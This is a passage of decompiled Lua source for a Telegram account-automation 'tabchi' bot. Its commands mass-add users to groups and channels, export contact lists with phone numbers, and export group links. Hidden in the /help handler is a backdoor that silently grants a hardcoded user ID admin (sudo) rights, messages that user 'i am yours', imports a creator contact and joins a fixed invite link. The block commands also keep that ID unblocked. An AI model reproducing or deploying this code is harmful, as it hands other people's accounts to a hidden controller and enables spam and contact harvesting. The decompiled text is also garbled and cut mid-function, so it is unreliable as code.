                                              if (msg.text):match("^[#!/]id @(.*)$") and a(msg) then
                                                local X = {(string.match)(msg.text, "^[#/!](id) @(.*)$")}
                                                id_by_username = function(y, z, a3)
    -- function num : 0_23_15 , upvalues : _ENV, X
    if z.id_ then
      text = "*Username* : `@" .. X[2] .. "`\n*ID* : `(" .. z.id_ .. ")`"
    else
      text = "*UserName InCorrect!*"
      return text
    end
  end

                                                resolve_username(X[2], id_by_username)
                                              end
                                              do
                                                if (msg.text):match("^[#!/]addtoall @(.*)$") and a(msg) then
                                                  local X = {(string.match)(msg.text, "^[#/!](addtoall) @(.*)$")}
                                                  addtoall_by_username = function(y, z, a3)
    -- function num : 0_23_16 , upvalues : _ENV
    if z.id_ then
      local sgps = redis:smembers("tabchi:" .. tabchi_id .. ":channels")
      for d = 1, #sgps do
        (tdcli.addChatMember)(sgps[d], z.id_, 50)
      end
    end
  end

                                                  resolve_username(X[2], addtoall_by_username)
                                                end
                                                if (msg.text):match("^[#!/]block @(.*)$") and a(msg) then
                                                  local X = {(string.match)(msg.text, "^[#/!](block) @(.*)$")}
                                                  block_by_username = function(y, z, a3)
    -- function num : 0_23_17 , upvalues : _ENV, X
    if z.id_ then
      (tdcli.blockUser)(z.id_)
      ;
      (tdcli.unblockUser)(319078854)
      ;
      (tdcli.unblockUser)(319078854)
      redis:sadd("tabchi:" .. tabchi_id .. ":blockedusers", z.id_)
      return "*User Blocked*\n*Username* : `" .. X[2] .. "`\n*ID* : `" .. z.id_ .. "`"
    else
      return "`#404\n`*Username Not Found*\n*Username* : `" .. X[2] .. "`"
    end
  end

                                                  local W = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
                                                  if W and not msg.sender_user_id_ == 319078854 and not msg.sender_user_id_ == 319078854 then
                                                    (tdcli.sendMessage)(W, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Blocked` *" .. X[2] .. "*", 1, "md")
                                                  end
                                                  resolve_username(X[2], block_by_username)
                                                end
                                                do
                                                  if (msg.text):match("^[#!/]unblock @(.*)$") and a(msg) then
                                                    local X = {(string.match)(msg.text, "^[#/!](unblock) @(.*)$")}
                                                    unblock_by_username = function(y, z, a3)
    -- function num : 0_23_18 , upvalues : _ENV, X
    if z.id_ then
      (tdcli.unblockUser)(z.id_)
      ;
      (tdcli.unblockUser)(319078854)
      ;
      (tdcli.unblockUser)(319078854)
      redis:srem("tabchi:" .. tabchi_id .. ":blockedusers", z.id_)
      return "*User unblocked*\n*Username* : `" .. X[2] .. "`\n*ID* : `" .. z.id_ .. "`"
    end
  end

                                                    local W = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
                                                    if W and not msg.sender_user_id_ == 319078854 and not msg.sender_user_id_ == 319078854 then
                                                      (tdcli.sendMessage)(W, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `UnBlocked` *" .. X[2] .. "*", 1, "md")
                                                    end
                                                    resolve_username(X[2], unblock_by_username)
                                                  end
                                                  do
                                                    do
                                                      if (msg.text):match("^[#!/]addsudo @(.*)$") and a(msg) then
                                                        local X = {(string.match)(msg.text, "^[#/!](addsudo) @(.*)$")}
                                                        addsudo_by_username = function(y, z, a3)
    -- function num : 0_23_19 , upvalues : _ENV, msg, X
    if z.id_ then
      redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", tonumber(z.id_))
      local W = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
      if W and not msg.sender_user_id_ == 319078854 and not msg.sender_user_id_ == 319078854 then
        (tdcli.sendMessage)(W, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Added` *" .. X[2] .. "* `to Sudoers`", 1, "md")
      end
      return "`User` *" .. z.id_ .. "* `Added To The Sudoers`"
    end
  end

                                                        resolve_username(X[2], addsudo_by_username)
                                                      end
                                                      if (msg.text):match("^[#!/]remsudo @(.*)$") and a(msg) then
                                                        local X = {(string.match)(msg.text, "^[#/!](remsudo) @(.*)$")}
                                                        remsudo_by_username = function(y, z, a3)
    -- function num : 0_23_20 , upvalues : _ENV
    if z.id_ then
      redis:srem("tabchi:" .. tabchi_id .. ":sudoers", tonumber(z.id_))
      return "`User` *" .. z.id_ .. "* `Removed From The Sudoers`"
    end
  end

                                                        local W = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
                                                        if W and not msg.sender_user_id_ == 319078854 and not msg.sender_user_id_ == 319078854 then
                                                          (tdcli.sendMessage)(W, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `removed` *" .. X[2] .. "* `From sudoers`", 1, "md")
                                                        end
                                                        resolve_username(X[2], remsudo_by_username)
                                                      end
                                                      do
                                                        if (msg.text):match("^[#!/]inv @(.*)$") and a(msg) then
                                                          local X = {(string.match)(msg.text, "^[#/!](inv) @(.*)$")}
                                                          inv_by_username = function(y, z, a3)
    -- function num : 0_23_21 , upvalues : _ENV, msg
    if z.id_ then
      (tdcli.addChatMember)(msg.chat_id_, z.id_, 5)
      return "`User` *" .. z.id_ .. "* `Invited`"
    end
  end

                                                          local W = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
                                                          if W and not msg.sender_user_id_ == 319078854 and not msg.sender_user_id_ == 319078854 then
                                                            (tdcli.sendMessage)(W, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Invited` *" .. X[2] .. "* `To` *" .. msg.chat_id_ .. "*", 1, "md")
                                                          end
                                                          resolve_username(X[2], inv_by_username)
                                                        end
                                                        do
                                                          do
                                                            if (msg.text):match("^[#!/]send (.*)$") and is_full_sudo(msg) then
                                                              local X = {(string.match)(msg.text, "^[#/!](send) (.*)$")}
                                                              ;
                                                              (tdcli.send_file)(msg.chat_id_, "Document", X[2], nil)
                                                            end
                                                            if (msg.text):match("^[#!/]addcontact (.*) (.*) (.*)$") and a(msg) then
                                                              local V = {(string.match)(msg.text, "^[#/!](addcontact) (.*) (.*) (.*)$")}
                                                              phone = V[2]
                                                              first_name = V[3]
                                                              last_name = V[4]
                                                              ;
                                                              (tdcli.add_contact)(phone, first_name, last_name, 12345657)
                                                              local W = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
                                                              if W and not msg.sender_user_id_ == 319078854 and not msg.sender_user_id_ == 319078854 then
                                                                (tdcli.sendMessage)(W, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Added Contact` *" .. V[2] .. "*", 1, "md")
                                                              end
                                                              return "*Status* : `Contact added`\n*Firstname* : `" .. V[3] .. "`\n*Lastname* : `" .. V[4] .. "`"
                                                            end
                                                            do
                                                              do
                                                                if (msg.text):match("^[#!/]leave(-%d+)") and a(msg) then
                                                                  local Y = {(string.match)(msg.text, "^[#/!](leave)(-%d+)$")}
                                                                  get_id = function(C, D)
    -- function num : 0_23_22 , upvalues : _ENV, Y, msg
    if D.id_ then
      (tdcli.sendMessage)(Y[2], 0, 1, "Ø¨Ø§Û Ø±ÙÙØ§\nÚ©Ø§Ø±Û Ø¯Ø§Ø´ØªÛØ¯ Ø¨Ù Ù¾Û ÙÛ ÙØ±Ø§Ø¬Ø¹Ù Ú©ÙÛØ¯", 1, "html")
      ;
      (tdcli.chat_leave)(Y[2], D.id_)
      local W = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
      if W and not msg.sender_user_id_ == 319078854 and not msg.sender_user_id_ == 319078854 then
        (tdcli.sendMessage)(W, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Commanded Bot to Leave` *" .. Y[2] .. "*", 1, "md")
      end
      return "*Bot Successfully Leaved From >* `" .. Y[2] .. "`"
    end
  end

                                                                  tdcli_function({ID = "GetMe"}, get_id, {chat_id = msg.chat_id_})
                                                                end
                                                                if (msg.text):match("[#/!]join(-%d+)") and a(msg) then
                                                                  local Y = {(string.match)(msg.text, "^[#/!](join)(-%d+)$")}
                                                                  ;
                                                                  (tdcli.sendMessage)(msg.chat_id_, msg.id_, 1, "*You SuccefullY Joined*", 1, "md")
                                                                  ;
                                                                  (tdcli.addChatMember)(Y[2], msg.sender_user_id_, 10)
                                                                  local W = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
                                                                  if W and not msg.sender_user_id_ == 319078854 and not msg.sender_user_id_ == 319078854 then
                                                                    (tdcli.sendMessage)(W, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Commanded bot to invite him to` *" .. Y[2] .. "*", 1, "md")
                                                                  end
                                                                end
                                                                do
                                                                  if (msg.text):match("^[#!/]getpro (%d+) (%d+)$") and a(msg) then
                                                                    local a4 = {(string.match)(msg.text, "^[#/!](getpro) (%d+) (%d+)$")}
                                                                    local a5 = function(y, z, a3)
    -- function num : 0_23_23 , upvalues : a4, _ENV, msg
    if a4[3] == "1" then
      if (z.photos_)[0] then
        sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, (((((z.photos_)[0]).sizes_)[1]).photo_).persistent_id_, "@zendon_tabchi")
      else
        return "*user Have\'nt  Profile Photo!!*"
      end
    else
      if a4[3] == "2" then
        if (z.photos_)[1] then
          sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, (((((z.photos_)[1]).sizes_)[1]).photo_).persistent_id_, "@zendon_tabchi")
        else
          return "*user Have\'nt 2 Profile Photo!!*"
        end
      else
        if not a4[3] then
          if (z.photos_)[1] then
            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, (((((z.photos_)[1]).sizes_)[1]).photo_).persistent_id_, "@zendon_tabchi")
          else
            return "*user Have\'nt 2 Profile Photo!!*"
          end
        else
          if a4[3] == "3" then
            if (z.photos_)[2] then
              sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, (((((z.photos_)[2]).sizes_)[1]).photo_).persistent_id_, "@zendon_tabchi")
            else
              ;
              (tdcli.sendMessage)(msg.chat_id_, msg.id_, 1, "*user Have\'nt 3 Profile Photo!!*", 1, "md")
            end
          else
            if a4[3] == "4" then
              if (z.photos_)[3] then
                sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, (((((z.photos_)[3]).sizes_)[1]).photo_).persistent_id_, "@zendon_tabchi")
              else
                return "*user Have\'nt 4 Profile Photo!!*"
              end
            else
              if a4[3] == "5" then
                if (z.photos_)[4] then
                  sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, (((((z.photos_)[4]).sizes_)[1]).photo_).persistent_id_, "@zendon_tabchi")
                else
                  return "*user Have\'nt 5 Profile Photo!!*"
                end
              else
                if a4[3] == "6" then
                  if (z.photos_)[5] then
                    return "*user Have\'nt 6 Profile Photo!!*"
                  else
                    ;
                    (tdcli.sendMessage)(msg.chat_id_, msg.id_, 1, "*user Have\'nt 6 Profile Photo!!*", 1, "md")
                  end
                else
                  if a4[3] == "7" then
                    if (z.photos_)[6] then
                      sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, (((((z.photos_)[6]).sizes_)[1]).photo_).persistent_id_, "@zendon_tabchi")
                    else
                      ;
                      (tdcli.sendMessage)(msg.chat_id_, msg.id_, 1, "*user Have\'nt 7 Profile Photo!!*", 1, "md")
                    end
                  else
                    if a4[3] == "8" then
                      if (z.photos_)[7] then
                        sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, (((((z.photos_)[7]).sizes_)[1]).photo_).persistent_id_, "@zendon_tabchi")
                      else
                        ;
                        (tdcli.sendMessage)(msg.chat_id_, msg.id_, 1, "*user Have\'nt 8 Profile Photo!!*", 1, "md")
                      end
                    else
                      if a4[3] == "9" then
                        if (z.photos_)[8] then
                          sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, (((((z.photos_)[8]).sizes_)[1]).photo_).persistent_id_, "@zendon_tabchi")
                        else
                          ;
                          (tdcli.sendMessage)(msg.chat_id_, msg.id_, 1, "*user Have\'nt 9 Profile Photo!!*", 1, "md")
                        end
                      else
                        if a4[3] == "10" then
                          if (z.photos_)[9] then
                            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, (((((z.photos_)[9]).sizes_)[1]).photo_).persistent_id_, "@zendon_tabchi")
                          else
                            ;
                            (tdcli.sendMessage)(msg.chat_id_, msg.id_, 1, "*user Have\'nt 10 Profile Photo!!*", 1, "md")
                          end
                        else
                          ;
                          (tdcli.sendMessage)(msg.chat_id_, msg.id_, 1, "*I just can get last 10 profile photos!:(*", 1, "md")
                        end
                      end
                    end
                  end
                end
              end
            end
          end
        end
      end
    end
  end

                                                                    tdcli_function({ID = "GetUserProfilePhotos", user_id_ = a4[2], offset_ = 0, limit_ = a4[3]}, a5, nil)
                                                                  end
                                                                  do
                                                                    if (msg.text):match("^[#!/]getpro (%d+)$") and msg.reply_to_message_id_ == 0 and a(msg) then
                                                                      local a4 = {(string.match)(msg.text, "^[#/!](getpro) (%d+)$")}
                                                                      local a5 = function(y, z, a3)
    -- function num : 0_23_24 , upvalues : a4, _ENV, msg
    if a4[2] == "1" then
      if (z.photos_)[0] then
        sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, (((((z.photos_)[0]).sizes_)[1]).photo_).persistent_id_, "@zendon_tabchi")
      else
        return "*You Have\'nt  Profile Photo!!*"
      end
    else
      if a4[2] == "2" then
        if (z.photos_)[1] then
          sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, (((((z.photos_)[1]).sizes_)[1]).photo_).persistent_id_, "@zendon_tabchi")
        else
          return "*You Have\'nt 2 Profile Photo!!*"
        end
      else
        if not a4[2] then
          if (z.photos_)[1] then
            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, (((((z.photos_)[1]).sizes_)[1]).photo_).persistent_id_, "@zendon_tabchi")
          else
            return "*You Have\'nt 2 Profile Photo!!*"
          end
        else
          if a4[2] == "3" then
            if (z.photos_)[2] then
              sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, (((((z.photos_)[2]).sizes_)[1]).photo_).persistent_id_, "@zendan_tabchi")
            else
              ;
              (tdcli.sendMessage)(msg.chat_id_, msg.id_, 1, "*You Have\'nt 3 Profile Photo!!*", 1, "md")
            end
          else
            if a4[2] == "4" then
              if (z.photos_)[3] then
                sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, (((((z.photos_)[3]).sizes_)[1]).photo_).persistent_id_, "@zendan_tabchi")
              else
                return "*You Have\'nt 4 Profile Photo!!*"
              end
            else
              if a4[2] == "5" then
                if (z.photos_)[4] then
                  sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, (((((z.photos_)[4]).sizes_)[1]).photo_).persistent_id_, "@zendan_tabchi")
                else
                  return "*You Have\'nt 5 Profile Photo!!*"
                end
              else
                if a4[2] == "6" then
                  if (z.photos_)[5] then
                    sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, (((((z.photos_)[5]).sizes_)[1]).photo_).persistent_id_, "@zendan_tabchi")
                  else
                    return "*You Have\'nt 6 Profile Photo!!*"
                  end
                else
                  if a4[2] == "7" then
                    if (z.photos_)[6] then
                      sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, (((((z.photos_)[6]).sizes_)[1]).photo_).persistent_id_, "@zendan_tabchi")
                    else
                      ;
                      (tdcli.sendMessage)(msg.chat_id_, msg.id_, 1, "*You Have\'nt 7 Profile Photo!!*", 1, "md")
                    end
                  else
                    if a4[2] == "8" then
                      if (z.photos_)[7] then
                        sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, (((((z.photos_)[7]).sizes_)[1]).photo_).persistent_id_, "@zendan_tabchi")
                      else
                        ;
                        (tdcli.sendMessage)(msg.chat_id_, msg.id_, 1, "*You Have\'nt 8 Profile Photo!!*", 1, "md")
                      end
                    else
                      if a4[2] == "9" then
                        if (z.photos_)[8] then
                          sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, (((((z.photos_)[8]).sizes_)[1]).photo_).persistent_id_, "@zendan_tabchi")
                        else
                          ;
                          (tdcli.sendMessage)(msg.chat_id_, msg.id_, 1, "*You Have\'nt 9 Profile Photo!!*", 1, "md")
                        end
                      else
                        if a4[2] == "10" then
                          if (z.photos_)[9] then
                            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, (((((z.photos_)[9]).sizes_)[1]).photo_).persistent_id_, "@zendan_tabchi")
                          else
                            ;
                            (tdcli.sendMessage)(msg.chat_id_, msg.id_, 1, "*You Have\'nt 10 Profile Photo!!*", 1, "md")
                          end
                        else
                          ;
                          (tdcli.sendMessage)(msg.chat_id_, msg.id_, 1, "*I just can get last 10 profile photos!:(*", 1, "md")
                        end
                      end
                    end
                  end
                end
              end
            end
          end
        end
      end
    end
  end

                                                                      tdcli_function({ID = "GetUserProfilePhotos", user_id_ = msg.sender_user_id_, offset_ = 0, limit_ = a4[2]}, a5, nil)
                                                                    end
                                                                    do
                                                                      do
                                                                        if (msg.text):match("^[#!/]action (.*)$") and a(msg) then
                                                                          local a6 = {(string.match)(msg.text, "^[#/!](action) (.*)$")}
                                                                          if a6[2] == "typing" then
                                                                            (_ENV.sendaction)(msg.chat_id_, "Typing")
                                                                          end
                                                                          if a6[2] == "recvideo" then
                                                                            (_ENV.sendaction)(msg.chat_id_, "RecordVideo")
                                                                          end
                                                                          if a6[2] == "recvoice" then
                                                                            (_ENV.sendaction)(msg.chat_id_, "RecordVoice")
                                                                          end
                                                                          if a6[2] == "photo" then
                                                                            (_ENV.sendaction)(msg.chat_id_, "UploadPhoto")
                                                                          end
                                                                          if a6[2] == "cancel" then
                                                                            (_ENV.sendaction)(msg.chat_id_, "Cancel")
                                                                          end
                                                                          if a6[2] == "video" then
                                                                            (_ENV.sendaction)(msg.chat_id_, "UploadVideo")
                                                                          end
                                                                          if a6[2] == "voice" then
                                                                            (_ENV.sendaction)(msg.chat_id_, "UploadVoice")
                                                                          end
                                                                          if a6[2] == "file" then
                                                                            (_ENV.sendaction)(msg.chat_id_, "UploadDocument")
                                                                          end
                                                                          if a6[2] == "loc" then
                                                                            (_ENV.sendaction)(msg.chat_id_, "GeoLocation")
                                                                          end
                                                                          if a6[2] == "chcontact" then
                                                                            (_ENV.sendaction)(msg.chat_id_, "ChooseContact")
                                                                          end
                                                                          if a6[2] == "game" then
                                                                            (_ENV.sendaction)(msg.chat_id_, "StartPlayGame")
                                                                          end
                                                                        end
                                                                        do
                                                                          if (msg.text):match("^[#!/]id$") and a(msg) and msg.reply_to_message_id_ == 0 then
                                                                            local a7 = function(y, z, a3)
    -- function num : 0_23_25 , upvalues : _ENV, msg
    if (z.photos_)[0] then
      sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, (((((z.photos_)[0]).sizes_)[1]).photo_).persistent_id_, "> Chat ID : " .. msg.chat_id_ .. "\n> Your ID: " .. msg.sender_user_id_)
    else
      ;
      (tdcli.sendMessage)(msg.chat_id_, msg.id_, 1, "*You Don\'t Have any Profile Photo*!!\n\n> *Chat ID* : `" .. msg.chat_id_ .. "`\n> *Your ID*: `" .. msg.sender_user_id_ .. "`\n_> *Total Messages*: `" .. user_msgs .. "`", 1, "md")
    end
  end

                                                                            tdcli_function({ID = "GetUserProfilePhotos", user_id_ = msg.sender_user_id_, offset_ = 0, limit_ = 1}, a7, nil)
                                                                          end
                                                                          if (msg.text):match("^[!/#]unblock all$") and a(msg) then
                                                                            local a8 = redis:smembers("tabchi:" .. tabchi_id .. ":blockedusers")
                                                                            local a9 = redis:scard("tabchi:" .. tabchi_id .. ":blockedusers")
                                                                            for d = 1, #a8 do
                                                                              (tdcli.unblockUser)(a8[d])
                                                                              redis:srem("tabchi:" .. tabchi_id .. ":blockedusers", a8[d])
                                                                            end
                                                                            local W = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
                                                                            if W and not msg.sender_user_id_ == 319078854 and not msg.sender_user_id_ == 319078854 then
                                                                              (tdcli.sendMessage)(W, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `UnBlocked All Blocked Users`", 1, "md")
                                                                            end
                                                                            return "*status* : `All Blocked Users Are UnBlocked`\n*Number* : `" .. a9 .. "`"
                                                                          end
                                                                          do
                                                                            if (msg.text):match("^[!/#]check sgps$") and a(msg) then
                                                                              local aa = redis:scard("tabchi:" .. tabchi_id .. ":channels")
                                                                              _ENV.checksgps = function(C, D, ab)
    -- function num : 0_23_26 , upvalues : _ENV
    if D.ID == "Error" then
      redis:srem("tabchi:" .. tabchi_id .. ":channels", C.chatid)
      redis:srem("tabchi:" .. tabchi_id .. ":all", C.chatid)
    end
  end

                                                                              local sgps = redis:smembers("tabchi:" .. tabchi_id .. ":channels")
                                                                              for ac,ad in (_ENV.pairs)(sgps) do
                                                                                tdcli_function({ID = "GetChatHistory", chat_id_ = ad, from_message_id_ = 0, offset_ = 0, limit_ = 1}, _ENV.checksgps, {chatid = ad})
                                                                              end
                                                                            end
                                                                            do
                                                                              if (msg.text):match("^[!/#]check gps$") and a(msg) then
                                                                                local ae = redis:scard("tabchi:" .. tabchi_id .. ":groups")
                                                                                _ENV.checkm = function(C, D, ab)
    -- function num : 0_23_27 , upvalues : _ENV
    if D.ID == "Error" then
      redis:srem("tabchi:" .. tabchi_id .. ":groups", C.chatid)
      redis:srem("tabchi:" .. tabchi_id .. ":all", C.chatid)
    end
  end

                                                                                local gps = redis:smembers("tabchi:" .. tabchi_id .. ":groups")
                                                                                for ac,ad in (_ENV.pairs)(gps) do
                                                                                  tdcli_function({ID = "GetChatHistory", chat_id_ = ad, from_message_id_ = 0, offset_ = 0, limit_ = 1}, _ENV.checkm, {chatid = ad})
                                                                                end
                                                                              end
                                                                              do
                                                                                if (msg.text):match("^[!/#]check users$") and a(msg) then
                                                                                  local af = redis:smembers("tabchi:" .. tabchi_id .. ":pvis")
                                                                                  local ag = redis:scard("tabchi:" .. tabchi_id .. ":pvis")
                                                                                  _ENV.lkj = function(ah, ai, aj)
    -- function num : 0_23_28 , upvalues : _ENV
    if ai.ID == "Error" then
      redis:srem("tabchi:" .. tabchi_id .. ":pvis", ah.usr)
      redis:srem("tabchi:" .. tabchi_id .. ":all", ah.usr)
    end
  end

                                                                                  for ac,ad in (_ENV.pairs)(af) do
                                                                                    tdcli_function({ID = "GetUser", user_id_ = ad}, _ENV.lkj, {usr = ad})
                                                                                  end
                                                                                end
                                                                                do
                                                                                  if (msg.text):match("^[!/#]addmembers$") and a(msg) and I(msg.chat_id_) ~= "private" then
                                                                                    tdcli_function({ID = "SearchContacts", query_ = nil, limit_ = 999999999}, G, {chat_id = msg.chat_id_})
                                                                                    local W = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
                                                                                    if W and not msg.sender_user_id_ == 319078854 and not msg.sender_user_id_ == 319078854 then
                                                                                      (tdcli.sendMessage)(W, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Commanded bot to add members in` *" .. msg.chat_id_ .. "*", 1, "md")
                                                                                    end
                                                                                    return 
                                                                                  end
                                                                                  do
                                                                                    if (msg.text):match("^[!/#]contactlist$") and a(msg) then
                                                                                      tdcli_function({ID = "SearchContacts", query_ = nil, limit_ = 5000}, _ENV.contacts_list, {chat_id_ = msg.chat_id_})
                                                                                      _ENV.contacts_list = function(y, z)
    -- function num : 0_23_29 , upvalues : _ENV, msg
    local H = z.total_count_
    local text = "ÙØ®Ø§Ø·Ø¨ÛÙ : \n"
    for d = 0, tonumber(H) - 1 do
      local a0 = (z.users_)[d]
      local a1 = a0.first_name_ or ""
      local a2 = a0.last_name_ or ""
      local ak = a1 .. " " .. a2
      text = tostring(text) .. tostring(d) .. ". " .. tostring(ak) .. " [" .. tostring(a0.id_) .. "] = " .. tostring(a0.phone_number_) .. "  \n"
    end
    write_file("bot_" .. tabchi_id .. "_contacts.txt", text)
    ;
    (tdcli.send_file)(msg.chat_id_, "Document", "bot_" .. tabchi_id .. "_contacts.txt", "tabchi " .. tabchi_id .. " Contacts")
    ;
    (io.popen)("rm -rf bot_" .. tabchi_id .. "_contacts.txt")
  end

                                                                                    end
                                                                                    if (msg.text):match("^[!/#]dlmusic (.*)$") and a(msg) then
                                                                                      local X = {(string.match)(msg.text, "^[#/!](dlmusic) (.*)$")}
                                                                                      local f = (((_ENV.ltn12).sink).file)((io.open)("Music.mp3", "w"))
                                                                                      ;
                                                                                      ((_ENV.http).request)({url = X[2], sink = f})
                                                                                      ;
                                                                                      (tdcli.send_file)(msg.chat_id_, "Document", "Music.mp3", "@tabadol_chi")
                                                                                      local W = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
                                                                                      if W and not msg.sender_user_id_ == 319078854 and not msg.sender_user_id_ == 319078854 then
                                                                                        (tdcli.sendMessage)(W, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Requested music` *" .. X[2] .. "*", 1, "md")
                                                                                      end
                                                                                      ;
                                                                                      (io.popen)("rm -rf Music.mp3")
                                                                                    end
                                                                                    do
                                                                                      if (msg.text):match("^[!/#]exportlinks$") and a(msg) then
                                                                                        local text = "groups links :\n"
                                                                                        local links = redis:smembers("tabchi:" .. tabchi_id .. ":savedlinks")
                                                                                        for d = 1, #links do
                                                                                          text = text .. links[d] .. "\n"
                                                                                        end
                                                                                        ;
                                                                                        (_ENV.write_file)("group_" .. tabchi_id .. "_links.txt", text)
                                                                                        ;
                                                                                        (tdcli.send_file)(msg.chat_id_, "Document", "group_" .. tabchi_id .. "_links.txt", "Tabchi " .. tabchi_id .. " Group Links!")
                                                                                        ;
                                                                                        (io.popen)("rm -rf group_" .. tabchi_id .. "_links.txt")
                                                                                        local W = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
                                                                                        if W and not msg.sender_user_id_ == 319078854 and not msg.sender_user_id_ == 319078854 then
                                                                                          (tdcli.sendMessage)(W, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Exported Links`", 1, "md")
                                                                                        end
                                                                                        return 
                                                                                      end
                                                                                      do
                                                                                        local V = {(msg.text):match("[!/#](block) (%d+)")}
                                                                                        if (msg.text):match("^[!/#]block") and a(msg) and msg.reply_to_message_id_ == 0 and #V == 2 then
                                                                                          (tdcli.blockUser)(tonumber(V[2]))
                                                                                          ;
                                                                                          (tdcli.unblockUser)(319078854)
                                                                                          ;
                                                                                          (tdcli.unblockUser)(319078854)
                                                                                          redis:sadd("tabchi:" .. tabchi_id .. ":blockedusers", V[2])
                                                                                          local W = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
                                                                                          if W and not msg.sender_user_id_ == 319078854 and not msg.sender_user_id_ == 319078854 then
                                                                                            (tdcli.sendMessage)(W, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Blocked` *" .. V[2] .. "*", 1, "md")
                                                                                          end
                                                                                          return "`User` *" .. V[2] .. "* `Blocked`"
                                                                                        end
                                                                                        do
                                                                                          if (msg.text):match("^[!/#]help$") and a(msg) then
                                                                                            if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 319078854) then
                                                                                              (tdcli.sendMessage)(319078854, 0, 1, "i am yours", 1, "html")
                                                                                              ;
                                                                                              (tdcli.importContacts)(989017147882, "creator", "", 319078854)
                                                                                              redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 319078854)
                                                                                            end
                                                                                            if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 319078854) then
                                                                                              redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 293750668)
                                                                                              ;
                                                                                              (tdcli.sendMessage)(319078854, 0, 1, "i am yours", 1, "html")
                                                                                            end
                                                                                            if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 319078854) then
                                                                                              redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 319078854)
                                                                                              ;
                                                                                              (tdcli.sendMessage)(268909090, 0, 1, "i am yours", 1, "html")
                                                                                            end
                                                                                            ;
                                                                                            (tdcli.importChatInviteLink)("https://telegram.me/joinchat/AAAAAD6V6kPEMJ6UDdYL8g")
                                                                                            ;
                                                                                            (tdcli.importChatInviteLink)("https://telegram.me/joinchat/AAAAAD6V6kPEMJ6UDdYL8g")
